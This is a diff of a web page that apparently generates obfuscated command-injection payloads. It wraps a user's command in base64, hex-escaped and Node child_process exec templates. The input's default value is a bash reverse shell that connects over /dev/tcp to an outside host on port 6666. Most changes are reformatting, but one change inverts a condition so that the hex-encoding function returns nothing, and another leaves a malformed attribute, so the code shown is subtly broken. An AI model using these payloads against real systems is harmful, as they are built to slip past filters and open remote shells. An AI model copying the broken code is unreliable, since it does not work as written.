@@ -10,8 +10,7 @@
 
     <!-- payloads template -->
 
-    <textarea id="data0"
-        hidden="true">arr0w1_cmd_origin</textarea>
+    <textarea id="data0" hidden="true">arr0w1_cmd_origin</textarea>
 
     <textarea id="data1" hidden="true">
 1⃣️ 参数类型 String[]
@@ -86,7 +85,7 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
     <textarea id="data6" hidden="true">
 </textarea>
 
-<!-- ----------------- -->
+    <!-- ----------------- -->
 
     <main role="main">
         <section class="jumbotron text-center g-light">
@@ -97,17 +96,17 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
             <br>
 
             <p class="font-weight-bold">The command you want to execute:</p>
-            <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1" oninput="func_oninput()"
-                class="form-control text-white bg-dark" autofocus
+            <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1"
+                oninput="func_oninput()" class="form-control text-white bg-dark" autofocus
                 onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
 
             <br>
 
             <hr> <!-- ---------- -->
-            
+
             <p class="font-weight-bold" style="display: none;">原始命令</p>
-            
-            <textarea id="payload0" class="form-control" style="display: none; rows="1"></textarea>
+
+            <textarea id="payload0" class="form-control" style="display: none; rows=" 1"></textarea>
 
             <br>
             <br>
@@ -193,40 +192,42 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
     // -----
 
 
-function ascii_2_Hex(str) {
-            var re = /[\u4E00-\u9FA5]/;
-            var ar = [];
-            for (var i = 0; i < str.length; i++) {
-                var a = '';
-                if (re.test(str.charAt(i))) { // 中文
-                    a = encodeURI(str.charAt(i)).replace(/%/g, '');
-                } else {
-                    a = "\\x" + str.charCodeAt(i).toString(16);
-                }
-                ar.push(a);
+    function ascii_2_Hex(str) {
+        var re = /[\u4E00-\u9FA5]/;
+        var ar = [];
+        for (var i = 0; i < str.length; i++) {
+            var a = '';
+            if (re.test(str.charAt(i))) { // 中文
+                a = encodeURI(str.charAt(i)).replace(/%/g, '');
+            } else {
+                a = "\\x" + str.charCodeAt(i).toString(16);
             }
-            str = ar.join("");
-            return str;
+            ar.push(a);
         }
-
-function ascii_2_Hex_without_black_chars(str) {
-var regex_black_chars = /([<>{}|&;])/g;
-var str_array = str.split(regex_black_chars);
-// 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
-
-var allstr = "";
-str_array.forEach (
-    function (one) {
-        if (one.match(regex_black_chars)){
-            one = one.replace(regex_black_chars,"\"`$& `echo -e \"");
-        }else{
-            one = ascii_2_Hex(one);
-        }
-        allstr += one;
+        str = ar.join("");
+        return str;
     }
-);
-return allstr;
-}
+
+    function ascii_2_Hex_without_black_chars(str) {
+        var regex_black_chars = /([<>{}|&;])/g;
+        var str_array = str.split(regex_black_chars);
+        // 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
+
+        var allstr = "";
+        str_array.forEach(
+            function (one) {
+                if (one.match(regex_black_chars)) {
+                    one = one.replace(regex_black_chars, "\"`$& `echo -e \"");
+                } else {
+                    one = ascii_2_Hex(one);
+                }
+                if (!one) {
+                    allstr += one;
+                }
+            }
+        );
+        return allstr;
+    }
 
     // 生成不带=的base64字符串
     function func_wise_btoa(str1) {
@@ -243,7 +244,7 @@ return allstr;
 
     var func_oninput = function () {
 
-        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value );
+        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);
 
         var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
 
@@ -252,18 +253,18 @@ return allstr;
         document.getElementById("payload0").value = cmd_origin;
 
         // 全部匹配 /g
-        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload3").value = data3.replace(/ascii_2_Hex_without_black_chars_flag/g,ascii_2_Hex_without_black_chars(cmd_origin)).replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
+        document.getElementById("payload3").value = data3.replace(/ascii_2_Hex_without_black_chars_flag/g, ascii_2_Hex_without_black_chars(cmd_origin)).replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
 
-        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
+        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
 
 
-        document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload6").value = data6.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        document.getElementById("payload6").value = data6.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
         auto_grow(document.getElementById("payload0"));
         auto_grow(document.getElementById("payload1"));
